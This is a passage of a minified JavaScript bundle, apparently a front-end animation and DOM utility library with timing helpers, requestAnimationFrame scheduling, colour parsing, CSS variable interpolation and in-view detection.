pacificTimeToLocalTimeDate(t){var e=252e5;(new Date).getTimezoneOffset();let r=new Date(new Date(t).getTime()+e);return i.utcDateToLocalTimeZone(r)}static easternTimeToLocalTimeDate(t){var e=144e5;(new Date).getTimezoneOffset();let r=new Date(new Date(t).getTime()+e);return i.utcDateToLocalTimeZone(r)}static countdown(t,e){var i=e.getTime()-t.getTime();return{days:Math.floor(i/864e5),hours:Math.floor(i%864e5/36e5),minutes:Math.floor(i%36e5/6e4),seconds:Math.floor(i%6e4/1e3)}}};t.time=i})),pn=st((t=>{"use strict";var e=t&&t.__awaiter||function(t,e,i,r){return new(i||(i=Promise))((function(n,s){function o(t){try{l(r.next(t))}catch(t){s(t)}}function a(t){try{l(r.throw(t))}catch(t){s(t)}}function l(t){t.done?n(t.value):new i((function(e){e(t.value)})).then(o,a)}l((r=r.apply(t,e||[])).next())}))};Object.defineProperty(t,"__esModule",{value:!0});var i=Ks(),r=class{static debounce(t,e,i){let r;return function(...n){let s=this;!i&&void 0===r&&(r=+setTimeout((()=>{r=void 0,t.apply(s,n)}),e)),i&&null==r&&(t.apply(s,n),r=+setTimeout((()=>{r=void 0}),e))}}static throttle(t,e){return r.debounce(t,e,!0)}static wait(t){return e(this,void 0,void 0,(function*(){return new Promise((e=>setTimeout(e,t)))}))}static waitUntil(t,e=0,r=100){let n,s,o=i.time.now(),a=new Promise(((t,e)=>{n=t,s=e})),l=()=>{let a=i.time.timeDiffMs(o,i.time.now());t()?n():e&&a>e?s("Wait until timed out"):setTimeout(l,r)};return l(),a}static repeatUntil(t,e,r=0,n=100){let s,o,a=i.time.now(),l=new Promise(((t,e)=>{s=t,o=e})),h=()=>{let l=i.time.timeDiffMs(a,i.time.now());t()?s():r&&l>r?o("Wait until timed out"):(e(),setTimeout(h,n))};return h(),l}static memoizeSimple(t){let e=null,i=null;return(...r)=>{let n=JSON.stringify(r);return n==i?e:(i=n,e=t.apply(null,r))}}static memoize(t){let e={};return(...i)=>{let r=JSON.stringify(i);return e[r]?e[r]:e[r]=t.apply(null,i)}}static runOnceOnChange(t){let e=null,i=null;return(...r)=>{let n=JSON.stringify(r);if(n!==i)return i=n,e=t.apply(null,r)}}static setDefault(t,e){return Object.is(t,void 0)?e:t}static times(t,e){[...Array(t)].forEach(((t,i)=>{e(i)}))}};t.func=r})),nf=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Zr();t.bom=class{static smartResize(t,i){let r=0,n=i=>{let n=window.innerWidth;(!e.is.mobile()||r!==n)&&(t(i),r=n)};return window.addEventListener("resize",n,i),()=>{window.removeEventListener("resize",n)}}static appendBrowserNameToElement(t){let i={ieOrEdge:e.is.ieOrEdge,edge:e.is.edge,ie:e.is.ie,mobile:e.is.mobile,safari:e.is.safari,chrome:e.is.chrome,chromeOs:e.is.chrome,firefox:e.is.firefox,ios:e.is.ios,ipad:e.is.ipad};for(let e in i)i[e]()&&t.classList.add(e)}}})),Nt=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=nf();t.DomWatcher=class{constructor(){this.watcherConfigs=[]}add(t){let i=e=>{t.runWhen?t.runWhen()&&t.callback(e):t.callback(e)};t.listener=i,"smartResize"==t.on?t.remover=e.bom.smartResize(i,t.eventOptions||{}):(t.element.addEventListener(t.on,i,t.eventOptions||{}),t.remover=()=>{t.element.removeEventListener(t.on,i)}),this.watcherConfigs.push(t)}removeById(t){this.watcherConfigs=this.watcherConfigs.filter((e=>{if(!e.id||e.id!=t)return e;{let t=e.remover;t&&t()}}))}removeAll(){this.watcherConfigs.forEach((t=>{let e=t.remover;e&&e()})),this.watcherConfigs=[]}run(t){this.watcherConfigs.filter((e=>e.id&&e.id==t)).forEach((t=>{t.callback()&&t.callback()}))}dispose(){this.removeAll()}}})),fs=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=di(),i=Yl(),r=pn(),n=Zr(),s=Nt(),o=class{static getElementScrolledPercent(t,i=0,r=0,n=!1){let s=t.getBoundingClientRect(),o=(window.innerHeight-(s.top+i))/(s.height-i+r);return n?o:e.mathf.clampAsPercent(o)}static getScrollYAtPercent(t,i=0,r=0,n){let s=window.innerHeight,a=o.getScrollTop(t),l=a-s+i,h=a-s+t.offsetHeight+r;return e.mathf.lerp(l,h,n)}static setCssVariable(t,e,i){if(!t)throw new Error("You need specificy a valid element to apply a css variable");t.style.setProperty(e,i)}static setCssVariables(t,e){for(let i in e)t.style.setProperty(i,e[i])}static addStyles(t,e){for(var i in e)i.startsWith("--")&&o.setCssVariable(t,i,e[i]);Object.assign(t.style,e)}static testDescendant(t,e){for(var i=t.parentNode;i;){if(i==e)return!0;i=i.parentNode}return!1}static testVideoIsPlaying(t){return!t.paused&&!t.ended&&t.readyState>2}static resetAllVideosInElement(t){[...t.querySelectorAll("video")].forEach((t=>{t.currentTime=0}))}static pauseAllVideosInElement(t,e=!1){[...t.querySelectorAll("video")].forEach((t=>{e&&(t.currentTime=0),t.pause()}))}static playAllVideosInElement(t,e=!1){[...t.querySelectorAll("video")].forEach((t=>{e&&(t.currentTime=0),o.testVideoIsPlaying(t)||t.play().then((()=>{})).catch((t=>{}))}))}static whenVideosLoadedInElement(t,e=1e4){let i=[...t.querySelectorAll("video")];return this.whenVideosLoaded(i)}static whenVideosLoaded(t,e=1e4){let n=[];return t.forEach((t=>{let s=new i.Defer;n.push(s.getPromise()),r.func.waitUntil((()=>4==t.readyState),e,10).then((()=>{s.resolve()}))})),Promise.all(n)}static event(t,e,i){var r=new CustomEvent(e,{detail:i});t.dispatchEvent(r)}static createElementFromString(t){var e=document.createElement("div");return e.innerHTML=t.trim(),e.firstChild}static removeElement(t){t.parentNode.removeChild(t)}static runAfterWindowLoad(t){window.setTimeout((()=>{n.is.windowLoaded()?t():window.addEventListener("load",(()=>{t()}),{once:!0})}))}static runAfterNotTopOfScreen(t){0!==window.scrollY?t():window.addEventListener("scroll",(()=>{t()}),{once:!0,passive:!0})}static aspect(){return window.innerWidth/window.innerHeight}static getComputedStyle(t){return window.getComputedStyle(t)}static fetchAndMakeImage(t){return new Promise((e=>{fetch(t).then((t=>t.blob())).then((t=>{let i=t,r=document.createElement("img");r.decoding="async",r.onload=()=>{e(r)},r.src=URL.createObjectURL(i)}))}))}static makeImageFromBlob(t){return new Promise((e=>{let i=document.createElement("img");i.decoding="async",i.onload=()=>{i.onload=null,e(i)},i.src=URL.createObjectURL(t)}))}static makeBase64ImageFromBlob(t){return new Promise((e=>{let i=new FileReader;i.readAsDataURL(t),i.addEventListener("load",(()=>{let t=document.createElement("img");t.src=i.result,t.onload=()=>{t.onload=null,e(t)}}),{once:!0})}))}static copyBase64Image(t){return new Promise((e=>{let i=document.createElement("img");i.src=t.src,i.onload=()=>{i.onload=null,e(i)}}))}static deleteImage(t){t&&(t.src&&(t.src.startsWith("blob:")||t.src.startsWith("data:"))&&(URL.revokeObjectURL(t.src),t.src=""),t=null)}static flushVideos(t,e=""){let i=[...t.querySelectorAll("video")];i.forEach((t=>{let i=[...t.querySelectorAll("source")];i.forEach((t=>{let i=t.getAttribute(e)||t.src;t.setAttribute("data-video-src",i),t.removeAttribute("src"),t=null})),i=null,t.load()})),i=null}static unflushVideos(t,e=!1){let i=[...t.querySelectorAll("video")];i.forEach((t=>{let e=[...t.querySelectorAll("source")];e.forEach((t=>{if(!t.hasAttribute("data-video-src"))return;let e=t.getAttribute("data-video-src");t.setAttribute("src",e)})),e=null,t.load()})),i=null,e||o.playAllVideosInElement(t)}static getScrollTop(t,e=!1){return t?e&&t.offsetParent?t.getBoundingClientRect().top-t.offsetParent.getBoundingClientRect().top+window.scrollY:t.getBoundingClientRect().top+window.scrollY:0}static forceFocus(t){o.resetForceFocus();let e=t.getAttribute("tabindex");n.is.defined(e)&&!n.is.null(e)?t.setAttribute("forcetabindex",e):t.setAttribute("forcetabindex","none"),t.setAttribute("tabindex","-1"),t.focus()}static resetForceFocus(){Array.from(document.querySelectorAll("[forcetabindex]")).forEach((t=>{let e=t.getAttribute("forcetabindex");n.is.defined(e)&&!n.is.null(e)&&"none"!==e?t.setAttribute("tabindex",e):t.removeAttribute("tabindex"),t.removeAttribute("forcetabindex")}))}static forceVOFocus(t,e=10,i=10){var r=e,n=i;t.setAttribute("tabindex","0"),t.blur();var s=0;e=window.setInterval((function(){t.focus(),++s>=n&&window.clearInterval(e)}),r)}static getStyle(t){return t.currentStyle||window.getComputedStyle(t)}static isDisplayNone(t){return"none"==window.getComputedStyle(t).display}static isDisplayNoneWithAncestors(t){let e=o.isDisplayNone(t);for(;t=t.parentElement;)e||(e=o.isDisplayNone(t));return e}static removeClassByPrefix(t,e){var i=new RegExp("\\b"+e+".*?\\b","g");return t.className=t.className.replace(i,""),t}static getAllTextNodes(t){for(var e,i=[],r=document.createTreeWalker(t,NodeFilter.SHOW_TEXT,null,!1);e=r.nextNode();)i.push(e);return i}static appendAfter(t,e){e.parentNode.insertBefore(t,e.nextSibling)}static disableScrolling(){let t=t=>{t.preventDefault()},e=new s.DomWatcher;return e.add({element:window,on:"wheel",callback:t,eventOptions:{passive:!1}}),e.add({element:window,on:"touchmove",callback:t,eventOptions:{passive:!1}}),()=>{e.dispose()}}static unorphan(t,e=!1){let i=o.getAllTextNodes(t);e&&(i=[i[i.length-1]]);i.forEach((t=>{t.nodeValue=t.nodeValue.replace(/\s+([^\s]*)\s*$/," $1")}))}static getScrollElement(){return document.scrollingElement||document.documentElement}};t.dom=o})),Jt=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Yl();t.elementVisibility=class{static inview(t,i={},r){let n=[],s=null,o=null,a=!1,l=new e.Defer,h=window.location.search.split("evBypass=")[1];if(h=h&&h.split("&")[0],"true"==h)return window.setTimeout((()=>{r&&r(t,{isIntersecting:!0,isVisible:!0},(()=>{})),l.resolve()})),{observer:null,dispose:()=>{},state:()=>({ready:!0,inview:!0}),readyPromise:l.getPromise()};let c=()=>{u&&u.unobserve(t),u&&u.disconnect(),n=[],s=null},u=new IntersectionObserver((e=>{e.length>=1&&(n=e,s=e.slice(-1)[0],o=s.isIntersecting,a=!0,l.resolve()),r&&r(t,e.slice(-1)[0],c)}),i);return u.observe(t),{observer:u,dispose:c,state:()=>({changes:n,lastChange:s,inview:o,ready:a}),readyPromise:l.getPromise()}}}})),fa=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Ks(),i=Jt();t.Raf=class{constructor(t){this.isReadWriteOnly=!1,this.callbacks=[],this.isDisposed=!1,this.raf_=null,this.frame=null,this.lastUpdateTime=0,this.fps=0,this.currentFps=0,this.isPlaying=!1,this.isRunningRaf=!1,this.callbacks=[],this.runCondition=null,this.delta=0,this.elaspedTime=0,this.startTime=0,t?this.watch(t):this.isReadWriteOnly=!0,window.YANO_RAF_REGISTRY&&window.YANO_RAF_REGISTRY.register(this)}watch(t){this.callbacks.push(t)}setReadWriteMode(t){this.isReadWriteOnly=t}preRead(t){window.YANO_RAF_REGISTRY&&window.YANO_RAF_REGISTRY.addOneTimePreRead({callback:t,raf:this})}read(t){window.YANO_RAF_REGISTRY&&window.YANO_RAF_REGISTRY.addOneTimeRead({callback:t,raf:this})}write(t){window.YANO_RAF_REGISTRY&&window.YANO_RAF_REGISTRY.addOneTimeWrite({callback:t,raf:this})}postWrite(t){window.YANO_RAF_REGISTRY&&window.YANO_RAF_REGISTRY.addOneTimePostWrite({callback:t,raf:this})}unwatch(t){this.callbacks=this.callbacks.filter((e=>e==t))}runWhen(t){this.runCondition=t}runWhenElementIsInview(t,e){return this.ev&&this.ev.dispose(),this.runCondition=null,this.ev=i.elementVisibility.inview(t,e||{}),this.runWhen((()=>this.ev.state().inview)),this.ev.readyPromise}setFps(t){this.fps=t}start(t=!1){!t&&this.isPlaying||(this.startTime=("undefined"==typeof performance?Date:performance).now(),this.animationLoop_(),this.isPlaying=!0)}stop(){this.isPlaying=!1,window.cancelAnimationFrame(this.raf_),this.isRunningRaf=!1}dispose(){this.ev&&this.ev.dispose(),this.callbacks=null,this.isDisposed=!0,this.stop(),window.YANO_RAF_REGISTRY&&window.YANO_RAF_REGISTRY.unregister(this)}getDelta(t){return t?this.delta/1e3:this.delta}getElapsedTime(){return this.elaspedTime}getStartTime(){return this.startTime}getCurrentFps(){return this.currentFps}animationLoop_(){if(!this.isRunningRaf){if(this.raf_=window.requestAnimationFrame((t=>{this.frame=t,this.isRunningRaf=!1,this.animationLoop_()})),this.isRunningRaf=!0,this.lastUpdateTime){let t=e.time.now()-this.lastUpdateTime;this.delta=t,this.elaspedTime+=t/1e3;let i=0==this.fps?0:1e3/this.fps;this.currentFps=1e3/t,t>i&&(this.callbacks&&this.callbacks.forEach((e=>{let i=()=>{e(this.frame,this.lastUpdateTime,t,(()=>{this.stop()}))};this.runCondition?this.runCondition()&&i():i()})),this.lastUpdateTime=e.time.now())}this.lastUpdateTime||(this.lastUpdateTime=e.time.now())}}};var r=class{constructor(){this.preReads=[],this.reads=[],this.writes=[],this.postWrites=[],this.rafs=[]}static runRafCallbacks(t){for(;t.length;){let e=t.splice(0,1)[0];!e.raf.isDisposed&&(e.raf.isPlaying||e.raf.isReadWriteOnly)&&e.callback()}}start(){this.flushScheduled||(this.flushScheduled=!0,requestAnimationFrame((()=>{this.runRaf()})))}runRaf(){window.YANO_RAF_REGISTRY_DEBUG&&console.log("Running raf",this.reads.length,this.writes.length),r.runRafCallbacks(this.preReads),r.runRafCallbacks(this.reads),r.runRafCallbacks(this.writes),r.runRafCallbacks(this.postWrites),this.flushScheduled=!1}addOneTimePreRead(t){this.preReads.push(t),this.start()}addOneTimeRead(t){this.reads.push(t),this.start()}addOneTimeWrite(t){this.writes.push(t),this.start()}addOneTimePostWrite(t){this.postWrites.push(t),this.start()}getActiveRafCount(){return this.rafs.filter((t=>t.isPlaying)).length}getRafCount(){return this.rafs.length}register(t){this.rafs.push(t)}unregister(t){this.rafs=this.rafs.filter((e=>e==t))}};window&&!window.YANO_RAF_REGISTRY&&(window.YANO_RAF_REGISTRY=new r)})),hf=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=di(),i=Zr(),r=fa(),n=gt();t.RafProgress=class{constructor(t){this.currentProgress=0,this.precision=10,this.easeAmount=1,this.damp=1,this.rangeWatchers=[],this.callbacks=[],this.targetProgress=this.currentProgress,this.easingFunction=n.EASE.linear,t&&this.watch(t),this.raf=new r.Raf((()=>{this.rafLoop()}))}stop(){this.raf.stop()}setFps(t){this.raf.setFps(t)}run(){this.raf.start()}setPrecision(t){this.precision=t}watch(t){this.callbacks.push(t)}unwatch(t){this.callbacks=this.callbacks.filter((e=>e==t))}watchFor(t,e){this.rangeWatchers.push({range:t,callback:e})}unwatchFor(t){this.rangeWatchers=this.rangeWatchers.filter((e=>e.callback!==t))}rafLoop(){let t=this.currentProgress;i.is.null(this.damp)?this.currentProgress=e.mathf.ease(this.currentProgress,this.targetProgress,this.easeAmount,this.easingFunction):this.currentProgress=e.mathf.damp(this.currentProgress,this.targetProgress,this.easeAmount,this.damp),this.currentProgress=e.mathf.toFixed(this.currentProgress,this.precision),this.currentProgress<.5?this.currentProgress=e.mathf.floorToPrecision(this.currentProgress,this.precision-1):this.currentProgress=e.mathf.ceilToPrecision(this.currentProgress,this.precision-1),this.direction=e.mathf.direction(t,this.currentProgress),this.callbacks.forEach((t=>{t(this.currentProgress,this.direction)})),this.rangeWatchers.forEach((r=>{let n=!1;n=i.is.array(r.range)?e.mathf.isBetween(this.currentProgress,r.range[0],r.range[1]):e.mathf.isBetween(r.range,this.currentProgress,t),n&&r.callback(this.currentProgress,this.direction)})),t==this.currentProgress&&this.raf.stop()}setCurrentProgress(t,i=!0){this.currentProgress=i?t:e.mathf.clampAsProgress(t),this.targetProgress=this.currentProgress,this.easeAmount=1,this.raf.start()}easeTo(t,i,r=n.EASE.linear,s=!1){this.targetProgress=s?t:e.mathf.clampAsProgress(t),this.easeAmount=e.mathf.clampAsPercent(i),this.easingFunction=r,this.damp=null,this.raf.start(!0)}dampTo(t,i,r,n=!1){this.targetProgress=n?t:e.mathf.clampAsProgress(t),this.easeAmount=e.mathf.clampAsPercent(i),this.easingFunction=null,this.damp=r,this.raf.start(!0)}getLerpDelta(){return this.targetProgress-this.currentProgress}getScrollDirection(){return this.direction}dispose(){this.raf.dispose(),this.callbacks=[],this.rangeWatchers=[]}}})),Kl=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Ks(),i=di(),r=fa();t.RafTimer=class{constructor(t){this.rafLoop=t,this.raf=new r.Raf((()=>{this.animationLoop_()})),this.duration=0,this.progress=0,this.timeElapsed=0,this.timeSnapshot=0,this.playing=!1,this.completeCallback=null}animationLoop_(){if(!this.playing)return;let t=e.time.timeDiffMs(this.timeSnapshot,e.time.now());this.timeElapsed+=t,this.progress=i.mathf.clampAsPercent(this.timeElapsed/this.duration),this.timeSnapshot=e.time.now(),this.progress<1?this.rafLoop&&this.rafLoop(this.progress):(this.rafLoop&&this.rafLoop(1),this.reset(),this.raf.stop(),this.completeCallback&&this.completeCallback(1))}setDuration(t){this.duration=t}setFps(t){this.raf.setFps(t)}onComplete(t){this.completeCallback=t}play(){this.playing||(this.playing=!0,this.timeSnapshot=e.time.now(),this.raf.start())}reset(){this.playing=!1,this.raf.stop(),this.timeElapsed=0}pause(){this.raf.stop(),this.playing=!1}dispose(){this.raf.dispose()}}})),Jl=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=di(),i=gt(),r=class{constructor(){}static hexToRgbNormalized(t){let e=[];return e[0]=(t>>16&255)/255,e[1]=(t>>8&255)/255,e[2]=(255&t)/255,e}static colorRgbToRgb(t){return[t.r,t.g,t.b]}static normalizedRgbToHex(t){return(255*t[0]<<16)+(255*t[1]<<8)+(255*t[2]|0)}static rgbToNormalizedRgb(t){return[t[0]/255,t[1]/255,t[2]/255]}static normalizedRgbToRgb(t){return[255*t[0]>>0,255*t[1]>>0,255*t[2]>>0]}static rgbaLerp(t,i,r){return{r:e.mathf.lerp(t.r,i.r,r)>>0,g:e.mathf.lerp(t.g,i.g,r)>>0,b:e.mathf.lerp(t.b,i.b,r)>>0,a:e.mathf.lerp(t.a,i.a,r)}}static rgbaEase(t,i,r,n){return{r:e.mathf.ease(t.r,i.r,r,n)>>0,g:e.mathf.ease(t.g,i.g,r,n)>>0,b:e.mathf.ease(t.b,i.b,r,n)>>0,a:e.mathf.ease(t.a,i.a,r,n)}}static rgbToHex(t){return"#"+((1<<24)+(t.r<<16)+(t.g<<8)+t.b).toString(16).slice(1).toUpperCase()}static hexToRgba(t,e=1){t=t.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i,(function(t,e,i,r){return e+e+i+i+r+r}));var i=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(t),r=null;return i&&(r={r:parseInt(i[1],16),g:parseInt(i[2],16),b:parseInt(i[3],16),a:e}),r}static cssToRgba(t){if(i.is.cssHex(t))return r.hexToRgba(t);if(i.is.cssRgb(t)&&(t=(t=t.replace(")",",1)")).replace("rgb","rgba")),i.is.cssRgba(t)){var e=t.match(/^rgba\(\s*?(\d{1,3})\s*?,\s*?(\d{1,3})\s*?,\s*?(\d{1,3})\s*?,\s*?(\d*(?:\.\d+)?)\)$/);return e?{r:+e[1],g:+e[2],b:+e[3],a:+e[4]}:null}return null}static rgbaToCss(t){return`rgba(${t.r}, ${t.g}, ${t.b}, ${t.a})`}};t.color=r})),Js=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e,i,r=Zr(),n=Jl();(i=e=t.CssUnitObjectTypes||(t.CssUnitObjectTypes={})).number="num",i.unit="unit",i.cssHex="cssHex",i.rgba="rgba",i.rgb="rgb";t.cssUnit=class{static parse(t){let i=t.replace(/[a-zA-Z%]+/g,""),s=t.match(/[a-zA-Z%]+/g),o={value:null,unit:null,type:null,valueType:null,originalValue:t};return r.is.cssRgba(t)?(o.type=e.rgba,o.value=n.color.cssToRgba(t),o.valueType=e.rgba):r.is.cssRgb(t)?(o.type=e.rgb,o.value=n.color.cssToRgba(t),o.valueType=e.rgba):r.is.cssHex(t)?(o.value=n.color.cssToRgba(t),o.type=e.cssHex,o.valueType=e.rgba):(o.value=i?+i:null,o.unit=s?s[0]:null,o.type=e.unit,o.valueType=e.number),o.originalValue=t,o}}})),yf=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=di(),i=Zr(),r=Jl(),n=Js(),s=class{constructor(t){this.interpolateConfig=t,this.currentValue=0,this.currentProgress=0,this.calculate(0)}modify(t){return new s(t)}calculate(t){if(this.currentProgress=t,i.is.number(this.interpolateConfig.from))this.currentValue=e.mathf.ease(this.interpolateConfig.from,this.interpolateConfig.to,this.currentProgress,this.interpolateConfig.easeFunction);else{let t=n.cssUnit.parse(this.interpolateConfig.from),i=n.cssUnit.parse(this.interpolateConfig.to);if(t.valueType==n.CssUnitObjectTypes.number&&(this.currentValue=e.mathf.ease(t.value,i.value,this.currentProgress,this.interpolateConfig.easeFunction),this.currentValue=`${this.currentValue}${t.unit}`),t.valueType==n.CssUnitObjectTypes.rgba){let e=r.color.rgbaEase(t.value,i.value,this.currentProgress,this.interpolateConfig.easeFunction);this.currentValue=r.color.rgbaToCss(e)}}return this.currentValue}};t.Interpolate=s})),rc=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=di(),i=jl(),r=yf();t.multiInterpolateHelper={errors:{FROM_TO_EQUAL:"Range progress from and to values should not equal each other.",FROM_GREATER:"Range progress from greater than the value of to"},checkInvalidRangedProgresses:e=>{e.forEach((e=>{if(e.from==e.to)throw console.error(e),new Error(t.multiInterpolateHelper.errors.FROM_TO_EQUAL);if(e.from>e.to)throw console.error(e),new Error(t.multiInterpolateHelper.errors.FROM_GREATER)}))},findBestMatchingRangedProgress(t,e){let i=e[0];return e.forEach((e=>{let r=i;i.to<=t&&(i=e),i.from>t&&(i=r)})),i}};t.MultiInterpolate=class{constructor(t){this.interpolations=Object,this.parentProgress=0,this.currentValues={},this.config=t,this.updateConfig(this.config)}updateConfig(e){if(this.config=this.createStaggers(e),!this.config.interpolations)throw new Error("Multiinterpolation config is missing interpolations");this.config.interpolations=this.config.interpolations.map((e=>(t.multiInterpolateHelper.checkInvalidRangedProgresses(e.progress),e)))}createStaggers(t){let e=[];return[...t.interpolations].forEach((t=>{if(t.stagger&&!t.staggerItem)for(var i=0;i<t.stagger.count;i++){let r=Object.assign({},t);r.progress=r.progress.map((e=>((e=Object.assign({},e)).to+=i*t.stagger.progressOffset,e.from+=i*t.stagger.progressOffset,r.id=t.id+"-"+i,r.stagger=null,r.staggerItem=!0,e))),e.push(r)}})),e.forEach((e=>{t.interpolations.push(e)})),t}getCalculations(){return this.currentValues}calculate(n){this.parentProgress=n;this.currentValues;return this.config.interpolations.forEach((n=>{let s=t.multiInterpolateHelper.findBestMatchingRangedProgress(this.parentProgress,n.progress),o=e.mathf.childProgress(this.parentProgress,s.from,s.to);if(n.noInterpolation){if(!n.noInterpolationDefault)throw new Error("You are using noInterpolation without a noInterpolation default");e.mathf.isBetween(this.parentProgress,s.from,s.to,!0)?this.currentValues[n.id]=s.end:this.currentValues[n.id]=n.noInterpolationDefault}else{let t=new r.Interpolate({from:s.start,to:s.end,easeFunction:s.easingFunction||i.EASE.linear}).calculate(o);this.currentValues[n.id]=t}n.onUpdate&&n.onUpdate(n.id,this.parentProgress,this.currentValues[n.id])})),this.currentValues}}})),wy=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=class{static deepCopy(t){let i,r,n;if("object"!=typeof t||null===t)return t;for(n in i=Array.isArray(t)?[]:{},t)r=t[n],i[n]="object"==typeof r&&null!==r?e.deepCopy(r):r;return i}static max(t,e){let i,r=Number.NEGATIVE_INFINITY;return t.forEach((t=>{let n=e(t);r<n&&(i=t,r=n)})),i}};t.arrayf=e})),Sy=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=wy();t.objectf=class{static deepCopy(t){return e.arrayf.deepCopy(t)}static jsonCopy(t){return JSON.parse(JSON.stringify(t))}static areEqual(t,e){var i=Object.getOwnPropertyNames(t),r=Object.getOwnPropertyNames(e);if(i.length!=r.length)return!1;for(var n=0;n<i.length;n++){var s=i[n];if(t[s]!==e[s])return!1}return!0}static copy(t){return Object.assign({},t)}static forEach(t,e){Object.entries(t).forEach((([t,i])=>{e(t,i)}))}}})),Ki=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=di(),i=rc(),r=Jt(),n=fs(),s=Zr(),o=Js(),a=Sy();t.CssVarInterpolate=class{constructor(t,e){this.element=t,this.config=e,this.mainProgress=null,this.currentValues={},this.renderSubPixels=!0,this.multiInterpolate=e?new i.MultiInterpolate(e):null,this.elementVisibility=r.elementVisibility.inview(this.element),this.runOnceAfterOutView=!0,this.renderOnlyWhenInview=!0,this.ranOutViewUpdate=!1,this.batchUpdate=!1,this.precision=4,this.noWrite=!1,this.startProgress=0,this.endProgress=1}setInterpolations(t){t&&(this.multiInterpolate=new i.MultiInterpolate(t))}setPrecision(t){this.precision=t}flush(){this.mainProgress=null}useSubPixelRendering(t){this.renderSubPixels=t}useNoWrite(t){this.noWrite=t}useBatchUpdate(t){this.batchUpdate=t}renderOutview(t){this.renderOnlyWhenInview=!t}update(t,e=!1){if(this.multiInterpolate&&(e||t!=this.mainProgress)){if(this.renderOnlyWhenInview&&this.elementVisibility.state().ready&&!this.elementVisibility.state().inview)return void(this.runOnceAfterOutView&&!this.ranOutViewUpdate&&(this.ranOutViewUpdate=!0,this.updateValues(t>=.5?1:0)));this.ranOutViewUpdate=!1,this.updateValues(t)}}updateValues(t){if(!this.multiInterpolate)return;let i=e.mathf.toFixed(t,this.precision);if(this.mainProgress==i)return;this.mainProgress=e.mathf.childProgress(i,this.startProgress,this.endProgress,!0);let r=a.objectf.jsonCopy(this.currentValues);if(this.currentValues=this.multiInterpolate.calculate(this.mainProgress),!a.objectf.areEqual(r,this.currentValues)&&!this.noWrite){for(var l in this.currentValues){if(!this.renderSubPixels&&s.is.string(this.currentValues[l])){let t=o.cssUnit.parse(this.currentValues[l]);"px"==t.unit&&(this.currentValues[l]=(t.value>>0)+"px")}this.batchUpdate||n.dom.setCssVariable(this.element,l,this.currentValues[l])}this.batchUpdate&&n.dom.setCssVariables(this.element,this.currentValues)}}setProgressRange(t,e){this.startProgress=t,this.endProgress=e}getValues(){return this.currentValues}}})),gt=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=fs();t.dom=e.dom;var i=Nt();t.DomWatcher=i.DomWatcher;var r=nf();t.bom=r.bom;var n=di();t.mathf=n.mathf;var s=Zr();t.is=s.is;var o=pn();t.func=o.func;var a=Ks();t.time=a.time;var l=fa();t.Raf=l.Raf;var h=hf();t.RafProgress=h.RafProgress;var c=Kl();t.RafTimer=c.RafTimer;var u=yf();t.Interpolate=u.Interpolate;var d=Ki();t.CssVarInterpolate=d.CssVarInterpolate;var p=rc();t.MultiInterpolate=p.MultiInterpolate;var m=jl();t.EASE=m.EASE})),nc=st(((t,e)=>{var i=function(t){this.rafLoop=t,this.raf_=null,this.frame=null,this.lastUpdateTime=0,this.fps=0,this.playing=!1};i.prototype.setRafLoop=function(t){this.rafLoop=t},i.prototype.setFps=function(t){this.fps=t},i.prototype.start=function(){this.playing||(this.animationLoop_(),this.playing=!0)},i.prototype.animationLoop_=function(){if(this.raf_=window.requestAnimationFrame(function(t){this.frame=t,this.animationLoop_()}.bind(this)),this.lastUpdateTime){let t=Date.now()-this.lastUpdateTime;t>(0==this.fps?0:1e3/this.fps)&&(this.rafLoop(this.frame,this.lastUpdateTime,t,(()=>{this.stop()})),this.lastUpdateTime=Date.now())}this.lastUpdateTime||(this.lastUpdateTime=Date.now())},i.prototype.stop=function(){this.playing=!1,window.cancelAnimationFrame(this.raf_)},e.exports=i})),Dy=st(((t,e)=>{e.exports={enable:function(t,e,i){i?t.classList.add(e):t.classList.remove(e)},removeAdd:function(t,e,i){e.forEach((function(e){t.classList.remove(e)})),i.forEach((function(e){t.classList.add(e)}))}}})),Fy=st(((t,e)=>{e.exports={createDom:function(t,e){var i=document.createElement(t);return e&&(i.className=e),i}}})),qy=st(((t,e)=>{var i=new Map,r=new Map;function n(t){return r.has(t)?r.get(t):0}function s(t){if(!i.has(t)){i.set(t,(function(e){var i=(e=e||window.event).target||e.srcElement;i=3===i.nodeType?i.parentNode:i;do{t(i,e),i.parentNode&&(i=i.parentNode)}while(i.parentNode)}))}return i.get(t)}e.exports={addDelegatedListener:function(t,e,i){return function(t){r.set(t,n(t)+1)}(i),t.addEventListener(e,s(i))},removeDelegatedListener:function(t,e,o){var a=s(o);return function(t){r.set(t,n(t)-1)}(o),n(o)<=0&&i.delete(o),t.removeEventListener(e,a)}}})),Wy=st(((t,e)=>{e.exports={clone:function(t){var e={};for(var i in t)e[i]=t[i];return e},merge:function(t,e){for(var i in e)t[i]=e[i]}}}));function Tf(t){return new URLSearchParams(window.location.search).has(t)}var zy=Ge((()=>{})),pa,xf=Ge((()=>{pa=class{constructor(){this.resolve=()=>{},this.reject=()=>{},this.complete=!1,this.promise=new Promise(((t,e)=>{this.resolve=e=>(this.complete=!0,t(e)),this.reject=t=>(this.complete=!0,e(t))}))}getPromise(){return this.complete?new Promise((t=>{t()})):this.promise}}})),lc,jy=Ge((()=>{xf(),lc=class{static inview(t,e={},i){let r=null,n=null,s=null,o=!1,a=new pa,l=window.location.search.split("evBypass=")[1];if(l=l&&l.split("&")[0],"true"===l)return 